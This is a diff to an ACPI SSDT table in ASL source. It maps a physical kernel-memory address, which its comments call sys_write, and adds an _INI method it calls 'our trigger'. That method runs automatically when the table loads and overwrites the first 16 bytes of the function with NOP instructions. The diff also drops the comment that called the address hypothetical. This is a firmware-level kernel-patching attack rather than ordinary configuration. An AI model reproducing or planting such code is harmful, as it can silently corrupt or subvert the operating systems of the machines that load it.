@@ -5,19 +5,14 @@
  */
 DefinitionBlock ("SSDT", "SSDT", 1, "OEMID", "TABLEID", 0x00000001)
 {
-    // Define an OperationRegion pointing to the physical address
-    // of the target system call. This address is hypothetical.
-    OperationRegion (KMEM, SystemMemory, 0x01164B40, 0x10)
-
-    // Define a Field within that kernel memory region.
-    // This field represents the first 16 bytes of the function.
+    // OpRegion pointing to sys_write in kernel memory.
+    OperationRegion (KMEM, SystemMemory, 0x01164B40, 0x80)
     Field (KMEM, AnyAcc, NoLock, Preserve)
     {
-        SYSC,   128     // 128 bits = 16 bytes for the syscall
+        SYSC,   128  // Represents the first 16 bytes of the function.
     }
 
-    // _INI is a control method that the OS executes automatically
-    // when this ACPI table is loaded. This is our trigger.
+    // When this ACPI table is loaded. This is our trigger.
     Method (_INI)
     {
         // Create a buffer containing 16 bytes of NOP (0x90) instructions.
@@ -32,3 +27,4 @@ DefinitionBlock ("SSDT", "SSDT", 1, "OEMID", "TABLEID", 0x00000001)
         Store (NOPS, SYSC)
     }
 }
+
